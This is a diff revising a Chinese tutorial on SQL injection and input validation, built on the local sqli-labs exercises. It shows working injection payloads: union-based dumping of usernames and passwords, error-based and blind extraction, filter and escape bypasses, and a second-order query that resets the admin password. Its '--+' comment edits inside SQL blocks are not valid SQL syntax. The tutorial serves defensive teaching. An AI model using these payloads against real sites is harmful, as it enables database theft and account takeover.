@@ -17,7 +17,7 @@ title: '永远不要相信用户的输入：从 SQL 注入攻防看输入验证�
 
 ![](../sql-injection/1.png)
 
-这是一个常见的查询页面。`http://127.0.0.1/Less-1/?id=1` ，通过 `id=1` 传递参数。后端常见的 SQL 写法：`SELECT * FROM users WHERE id='$id' LIMIT 0,1";`
+这是一个常见的查询页面。`http://127.0.0.1/Less-1/?id=1` ，通过 `id=1` 传递参数。后端常见的 SQL 写法：`SELECT * FROM users WHERE id='$id' LIMIT 0,1;`
 
 
 攻击者可以通过构造 `id` 的参数值，执行任意的 SQL 语句：
@@ -27,7 +27,7 @@ title: '永远不要相信用户的输入：从 SQL 注入攻防看输入验证�
 
 
 其中关键步骤是构造 `1' --+`：
-1. 通过某个具体参数 `1` 和 单引号 `'` 来结束前面的语句：`SELECT * FROM users WHERE id='`，是其成为合法的 SQL 语句： `SELECT * FROM users WHERE id='1'`
+1. 通过某个具体参数 `1` 和 单引号 `'` 来结束前面的语句：`SELECT * FROM users WHERE id='`，使其成为合法的 SQL 语句： `SELECT * FROM users WHERE id='1'`
 2. 通过 `--+` 来注释后面的 `' LIMIT 0,1";`
 
 
@@ -45,13 +45,13 @@ title: '永远不要相信用户的输入：从 SQL 注入攻防看输入验证�
 你可以能会想，这又啥用呢？但实际上在没有**严格权限管理**的数据库上，我们可以通过构造下面语句获得所有库表的信息
 
 ```sql
-# 1. 查库：查询所有数据库的名称
+--+ 1. 查库：查询所有数据库的名称
 SELECT schema_name FROM information_schema.schemata
-# 2. 查表：查询指定数据库中的所有表
+--+ 2. 查表：查询指定数据库中的所有表
 SELECT table_name FROM information_schema.tables WHERE table_schema='security'
-# 3. 查列：查询表中的所有列
+--+ 3. 查列：查询表中的所有列
 SELECT column_name FROM information_schema.columns WHERE table_name='users'
-# 4. 查字段：获取用户表中的敏感数据，如用户名和密码
+--+ 4. 查字段：获取用户表中的敏感数据，如用户名和密码
 SELECT username, password FROM security.users
 ```
 
@@ -71,11 +71,11 @@ union select 1,2, group_concat(concat_ws('~',username,password)) from security.u
 
 
 ```sql
-# 0x7e 为 16 进制编码的 ~
+--+ 0x7e 为 16 进制编码的 ~
 SELECT updatexml(1, concat(0x7e, database()), 1) FROM DUAL;
 ```
 
-通过函数构造错误，将期望的信息以错误的信息提示出来：`?id=1' and updatexml(1,concat(0x7e,(database())),1); --+`
+通过函数构造错误，将期望的信息以错误的信息提示出来：`?id=1' and updatexml(1,concat(0x7e,(database())),1) --+`
 
 
 ![](../sql-injection/6.png)
@@ -97,12 +97,12 @@ XPATH syntax error: '~security'
 1. 通过 order by 测列宽 `?id=1')) order by 4 --+` 
 2. 通过 left 函数，逐个字符地遍历判断 `?id=1')) and left((select database()),1)='s'--+ `，当前库名首字母为 `s` 时会提示正确，否则提示错误
 
-tips：这里使用是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误
+tips：这里使用的是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误
 
 通过类似的原理我们可以按照行列顺序依次遍历：
 
 ```sql
-# 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号
+--+ 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号
 
 ?id=1')) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))>1--+
 ```
@@ -121,7 +121,7 @@ tips：这里使用是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 S
 构造 `?id=10' and sleep(5) --+` 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)
 
 ```sql
-?id=1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))>1112,1,sleep(5))--+ 
+?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))>1112,1,sleep(5))--+ 
 ```
 
 ---
@@ -130,12 +130,12 @@ tips：这里使用是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 S
 
 来自：[Less-25](https://github.com/Audi-1/sqli-labs/tree/master/Less-25)
 
-既然可以通过盲注来执行任意指令，那就直接加强参数的检查， replace 所有的 or 和 and
+既然可以通过盲注来执行任意指令，那就直接加强参数的检查， 替换（或过滤）所有的 or 和 and
 
 攻击者可以通过双写的方式绕过：`oorr` → 被过滤后变为 `or`，也可以通过 `||` 替代 `OR`，`&&` 替代 `AND`
 
 ```sql
-# ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0
+--+ ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0
 
 ?id=10' oorrder by 2;%00
 ```
@@ -155,7 +155,7 @@ tips：这里使用是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 S
 
 我们在其前面加上 `%df`，构造出 `%df\'`，即 `%df%5c%27`
 
-数据库使用 GBK 编码时 `%df%5c` 会被解码为 `運`，`\` 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 utf-8 转换为 utf-16 或 utf-32，将 ' 转为 utf-16
+数据库使用 GBK 编码时 `%df%5c` 会被解码为 `運`，`\` 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 UTF-8 转换为 UTF-16 或 UTF-32，将 ' 转为 UTF-16
 
 
 ---
@@ -208,7 +208,7 @@ UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr
 ```sql
 UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'
 
-# 移除注释，等价于
+--+ 移除注释，等价于
 UPDATE users SET PASSWORD='$pass' where username='admin'
 ```
 
